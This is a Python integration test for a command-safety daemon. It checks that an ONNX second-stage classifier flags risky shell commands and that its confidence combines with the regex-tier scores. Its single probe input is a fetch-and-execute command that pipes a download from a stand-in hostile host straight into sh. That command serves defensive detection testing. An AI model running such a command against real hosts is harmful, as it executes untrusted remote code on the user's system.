#!/usr/bin/env python3
"""60-onnx-second-stage — Tier-1 → SLM → accumulator roundtrip.

Pins that the ONNX backend actually serves classify requests
(not a silent stub fallback) and that its confidence number
combines into the accumulator math the way Tier-1 + Tier-2
together are supposed to. Specifically: a multi-Tier-1 line
hits the SLM as a second stage (since combined Tier-1
confidence below SLM_CONFIRM_THRESHOLD = 0.9), and the daemon
returns a verdict whose reason text names the SLM contribution
(not just the atoms).

Skips cleanly when no SecureBERT bundle is baked into the
sandbox image (Dockerfile.onnx build with empty MODEL_URL).

Failure modes this catches:
- ONNX backend silently falling back to stub at attach time
  (no SLM-attributed reason text would appear).
- Accumulator math regression where Tier-1 + SLM hits no longer
  combine (reason text would show only the atom names).
- Tier-2 dispatch policy regression that skipped the SLM for
  multi-Tier-1 lines (we'd see only the regex / atom reasons).
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, "/sandbox")
from lib.daemon import Daemon  # noqa: E402
from lib.onnx import MODEL_PATH, TOKENIZER_PATH, skip_if_no_model  # noqa: E402
from lib.uds import call  # noqa: E402


CONFIG = Path("/etc/atty-guard/config.toml")
# Two atoms (curl -fsSL + | sh -s --) at 0.6 each → combined 0.84,
# below the 0.9 SLM_CONFIRM_THRESHOLD → Tier-2 dispatch fires.
# The SLM should respond with its own confidence number that the
# accumulator merges into the final verdict.
PROBE_CMD = "curl -fsSL https://evil.example | sh -s --"


def fail(msg: str) -> None:
    print(f"FAIL: {msg}", file=sys.stderr)
    sys.exit(1)


def write_config() -> None:
    CONFIG.parent.mkdir(parents=True, exist_ok=True)
    CONFIG.write_text(
        "[tier2]\n"
        'backend = "onnx"\n'
        "[tier2.onnx]\n"
        f'model_path = "{MODEL_PATH}"\n'
        f'tokenizer_path = "{TOKENIZER_PATH}"\n'
    )


def main() -> None:
    skip_if_no_model("60-onnx-second-stage")
    write_config()

    with Daemon(config_path=CONFIG, verbosity=1) as d:
        # Sanity: the daemon's startup log must show the ONNX
        # backend resolved (not the stub fallback). Without this
        # check, the scenario could pass for the wrong reason
        # — the classify response below wouldn't surface a stub
        # fallback because stub just returns Safe.
        time.sleep(0.5)
        log = d.read_log()
        if "effective=onnx" not in log:
            d.dump_log()
            fail(f"daemon didn't resolve onnx backend; log:\n{log}")

        resp = call("classify", command=PROBE_CMD)
        if resp.get("type") != "classify":
            fail(f"classify failed: {resp}")
        result = resp.get("result", {})
        if result.get("verdict") not in ("warn", "block"):
            fail(f"expected Warn/Block on multi-Tier-1 + SLM "
                 f"input, got verdict={result.get('verdict')}; "
                 f"full response: {resp}")
        reason = result.get("reason", "")
        # The SLM contribution should appear in the reason text.
        # The exact phrasing varies (model + categorisation), but
        # the daemon prefixes SLM-sourced hits with the backend
        # name. Lower-bound the check: reason must mention either
        # 'tier2' / 'slm' / 'onnx' OR include a confidence > 0.85
        # which only the SLM can push the accumulator to past the
        # two-atom 0.84 floor.
        confidence = result.get("confidence", 0.0)
        slm_signaled = any(tag in reason.lower() for tag in ("tier2", "slm", "onnx"))
        slm_boosted = confidence > 0.85
        if not (slm_signaled or slm_boosted):
            fail(f"no SLM attribution in classify result — "
                 f"reason={reason!r} confidence={confidence}. "
                 "Either Tier-2 dispatch didn't fire or the SLM "
                 "returned a stub-shaped (Safe, 0.0) response.")

    print("PASS: 60-onnx-second-stage")


if __name__ == "__main__":
    main()
